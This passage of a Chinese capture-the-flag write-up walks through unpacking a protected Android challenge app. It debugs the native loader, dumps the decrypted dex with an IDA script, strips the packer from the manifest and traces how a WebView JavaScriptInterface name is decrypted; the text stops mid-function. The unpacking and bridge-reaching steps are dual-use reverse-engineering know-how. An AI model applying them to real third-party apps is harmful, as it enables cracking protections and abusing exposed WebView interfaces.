v24;</span><br><span class="line">  LODWORD(v27) = ali::NanoTime(v24);</span><br><span class="line">  v31 = *v6;</span><br><span class="line">  v28 = v27;</span><br><span class="line">  v32 = v20;</span><br><span class="line">  v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + <span class="number">13</span>, &amp;v31, v13, <span class="number">5</span>, <span class="number">1</span>, &amp;v33, &amp;off_54028);<span class="comment">// LZMA uncompress</span></span><br><span class="line">  LODWORD(v30) = ali::NanoTime(v29);</span><br><span class="line">  ali::PrettyDuration((ali *)(v30 - v28), v30 - v28);</span><br><span class="line">  munmap(v13, buf.st_blksize);</span><br><span class="line">  _android_log_print(</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="string">"debug"</span>,</span><br><span class="line">    <span class="string">"after uncompressed dex magic %c %c %c %c %c %c %c"</span>,<span class="comment">// dex magic after LZMA</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> __int8 *)v26 + v7),</span><br><span class="line">    v25[<span class="number">1</span>],</span><br><span class="line">    v25[<span class="number">2</span>],</span><br><span class="line">    v25[<span class="number">3</span>],</span><br><span class="line">    v25[<span class="number">4</span>],</span><br><span class="line">    v25[<span class="number">5</span>],</span><br><span class="line">    v25[<span class="number">6</span>]);</span><br><span class="line">  *v6 = v20;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    *v5 = (<span class="keyword">unsigned</span> __int8 *)*((_DWORD *)v4 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> *((_DWORD *)v4 + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Dump-Dex-File"><a href="#Dump-Dex-File" class="headerlink" title="Dump Dex File"></a>Dump Dex File</h1><p>知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00026A7E loc_26A7E                               ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j</span><br><span class="line">.text:00026A7E                 MOV             R1, R9  ; unsigned __int8 **</span><br><span class="line">.text:00026A80                 MOV             R2, R4  ; unsigned int *</span><br><span class="line">.text:00026A82                 MOVS            R3, #0x10 ; unsigned int</span><br><span class="line">.text:00026A84                 BL              _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint)</span><br><span class="line">.text:00026A88                 LDR.W           R3, [R9]</span><br><span class="line">.text:00026A8C                 ADDS            R3, #0x10</span><br><span class="line">.text:00026A8E                 STR             R3, [R6]</span><br></pre></td></tr></table></figure><p>运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/1.png" alt="monitor中显示的log信息"></p><p>根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/2.png" alt="R0所指向的数据部分"></p><p>接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/3.png" alt="dex文件大小位置"></p><p>接下来使用 IDC 脚本来 dump 数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, begin, end, len, b;</span><br><span class="line">    fp = fopen(<span class="string">"dump.dex"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    begin = <span class="number">0x7584C010</span>; <span class="comment">// 解密后数据在内存中的位置</span></span><br><span class="line">    len = <span class="number">0x0941FC</span>; <span class="comment">// 文件大小</span></span><br><span class="line">    end = begin + len;</span><br><span class="line">    <span class="keyword">for</span> (b = begin; b &lt; end; b++) &#123;</span><br><span class="line">        fputc(Byte(b), fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/4.png" alt="反编译dex得到的Java代码"></p><h1 id="Fix-Application"><a href="#Fix-Application" class="headerlink" title="Fix Application"></a>Fix Application</h1><p>使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;<span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.ali.tg.testapp"</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">"23"</span> <span class="attr">platformBuildVersionName</span>=<span class="string">"6.0-2438415"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:debuggable</span>=<span class="string">"true"</span> <span class="attr">android:icon</span>=<span class="string">"@drawable/ic_launcher"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".WebViewActivity"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。</p><h1 id="Find-Flag"><a href="#Find-Flag" class="headerlink" title="Find Flag"></a>Find Flag</h1><p>定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ali.tg.testapp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.widget.ListViewAutoScrollHelpern;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">ali</span>.<span class="title">tg</span>.<span class="title">testapp</span>.<span class="title">MainActivity</span>$1 <span class="keyword">implements</span> <span class="title">View</span>$<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">        com.ali.tg.testapp.MainActivity$<span class="number">1</span>(MainActivity arg1) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span> = arg1;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line">            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());</span><br><span class="line">            String v1 = MainActivity.<span class="keyword">this</span>.edit.getText().toString(); <span class="comment">// 获取EditText中的字符串</span></span><br><span class="line">            Intent v0 = <span class="keyword">new</span> Intent();</span><br><span class="line">            v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(<span class="string">"dV."</span>, <span class="number">2</span>), v1); <span class="comment">// 将v1的值传给Intent，变量名为“dV.”解密后的值</span></span><br><span class="line">            v0.setClass(MainActivity.<span class="keyword">this</span>, WebViewActivity.class); <span class="comment">// 设置Intent要跳转的类为WebViewActivity</span></span><br><span class="line">            MainActivity.<span class="keyword">this</span>.startActivity(v0); <span class="comment">// 启动WebViewActivity</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Button btn_enter;</span><br><span class="line">    View$OnClickListener btn_listener;</span><br><span class="line">    EditText edit;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.btn_enter = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.edit = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.btn_listener = <span class="keyword">new</span> com.ali.tg.testapp.MainActivity$<span class="number">1</span>(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F030000</span>);</span><br><span class="line">        <span class="keyword">this</span>.edit = <span class="keyword">this</span>.findViewById(<span class="number">0x7F060001</span>);</span><br><span class="line">        <span class="keyword">this</span>.btn_enter = <span class="keyword">this</span>.findViewById(<span class="number">0x7F060002</span>);</span><br><span class="line">        <span class="keyword">this</span>.btn_enter.setOnClickListener(<span class="keyword">this</span>.btn_listener);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ali.tg.testapp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.widget.ListViewAutoScrollHelpern;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebSettings;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaScriptInterface</span> </span>&#123;</span><br><span class="line">        Context mContext;</span><br><span class="line"></span><br><span class="line">        JavaScriptInterface(WebViewActivity arg1, Context arg2) &#123;</span><br><span class="line">            WebViewActivity.<span class="keyword">this</span> = arg1;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">            <span class="keyword">this</span>.mContext = arg2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">()</span> </span>&#123; <span class="comment">// 构造出一个页面能够调用这个函数就成功了</span></span><br><span class="line">            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.mContext, <span class="string">"祥龙！"</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WebView wView;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebViewActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.wView = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg7)</span> </span>&#123;</span><br><span class="line">        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg7);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F030001</span>);</span><br><span class="line">        <span class="keyword">this</span>.wView = <span class="keyword">this</span>.findViewById(<span class="number">0x7F060004</span>);</span><br><span class="line">        WebSettings v2 = <span class="keyword">this</span>.wView.getSettings();</span><br><span class="line">        v2.setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        v2.setJavaScriptCanOpenWindowsAutomatically(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.wView.addJavascriptInterface(<span class="keyword">new</span> JavaScriptInterface(<span class="keyword">this</span>, ((Context)<span class="keyword">this</span>)), ListViewAutoScrollHelpern.decrypt_native(<span class="string">"BQ1$*[w6G_"</span>, <span class="number">2</span>)); <span class="comment">// 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值</span></span><br><span class="line">        <span class="keyword">this</span>.wView.loadUrl(<span class="keyword">this</span>.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(<span class="string">"dV."</span>, <span class="number">2</span>))); <span class="comment">// 把在MainActivity中获取的变量作为url来加载</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><p>接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.support.v4.widget;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListViewAutoScrollHelpern</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"translate"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListViewAutoScrollHelpern</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">decrypt_native</span><span class="params">(String arg0, <span class="keyword">int</span> arg1)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLogv</span><span class="params">(String arg1)</span> </span>&#123;</span><br><span class="line">        Log.v(<span class="string">"cheatecore"</span>, arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLogw</span><span class="params">(String arg1)</span> </span>&#123;</span><br><span class="line">        Log.w(<span class="string">"cheatecore"</span>, arg1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">JNI_OnLoad</span><span class="params">(_JavaVM *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r1</span></span><br><span class="line">  jint v2; <span class="comment">// r2</span></span><br><span class="line">  _JNIEnv *v3; <span class="comment">// r4</span></span><br><span class="line">  jint v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// [sp+4h] [bp-Ch]</span></span><br><span class="line"></span><br><span class="line">  env = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (<span class="keyword">void</span> **)&amp;env, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = env;</span><br><span class="line">  register_Algorithm(env, v1, v2);</span><br><span class="line">  v4 = register_translate(v3);</span><br><span class="line">  v5 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">  result = v4 &amp; (v4 &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    result = <span class="number">65540</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 register_Algorithm 中发现了目标函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">register_Algorithm</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> a2, jint a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *v3; <span class="comment">// r4</span></span><br><span class="line">  jclass v4; <span class="comment">// r0</span></span><br><span class="line">  jclass v5; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, <span class="string">"android/support/v4/widget/ListViewAutoScrollHelpern"</span>);</span><br><span class="line">  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (<span class="keyword">const</span> JNINativeMethod *)off_607C, <span class="number">1</span>);</span><br><span class="line">  v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, <span class="string">"android/support/v4/view/PagerTitleStripIcsn"</span>);</span><br><span class="line">  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (<span class="keyword">const</span> JNINativeMethod *)off_607C, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定位到目标函数，发现其中调用了一个 vigenere_decrypt：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">jstring __<span class="function">fastcall <span class="title">decrypt_native</span><span class="params">(_JNIEnv *a1, jobject a2, jstring a3, jint a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  jstring data; <span class="comment">// r6</span></span><br><span class="line">  jint num; <span class="comment">// r9</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// r8</span></span><br><span class="line">  jstring v9; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+4h] [bp+0h]</span></span><br><span class="line"></span><br><span class="line">  data = a3;</span><br><span class="line">  num = a4;</span><br><span class="line">  env = a1;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v11, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, <span class="number">0</span>);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( num == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    vigenere_decrypt(v7, (<span class="keyword">char</span> *)&amp;v11);</span><br><span class="line">    v9 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = data;</span><br><span class="line">  &#125;</span><br><span class="line">  env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 vigenere_decrypt 函数中，对输入的数据进行了解密：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">vigenere_decrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *ciphertext, <span class="keyword">char</span> *plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ciphertext_1; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> *plaintext_1; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span 